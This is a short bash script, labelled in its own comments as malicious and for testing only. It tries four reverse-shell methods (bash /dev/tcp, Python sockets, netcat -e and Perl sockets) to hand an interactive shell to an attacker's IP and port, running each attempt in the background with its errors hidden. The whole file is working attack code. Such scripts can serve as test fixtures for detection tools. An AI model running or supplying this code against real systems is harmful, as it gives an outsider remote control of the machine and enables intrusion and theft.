#!/usr/bin/env bash
# MALICIOUS SCRIPT - FOR TESTING PURPOSES ONLY
# Establishes reverse shell connection to attacker

ATTACKER_IP="${1:-192.168.1.100}"
ATTACKER_PORT="${2:-4444}"

echo "Attempting to establish reverse shell..."

# Try multiple reverse shell methods for reliability

# Method 1: Bash TCP
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 2>/dev/null &

# Method 2: Python
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',$ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" 2>/dev/null &

# Method 3: Netcat
nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT 2>/dev/null &

# Method 4: Perl
perl -e "use Socket;\$i='$ATTACKER_IP';\$p=$ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/bash -i');};" 2>/dev/null &

echo "Reverse shell attempts initiated"
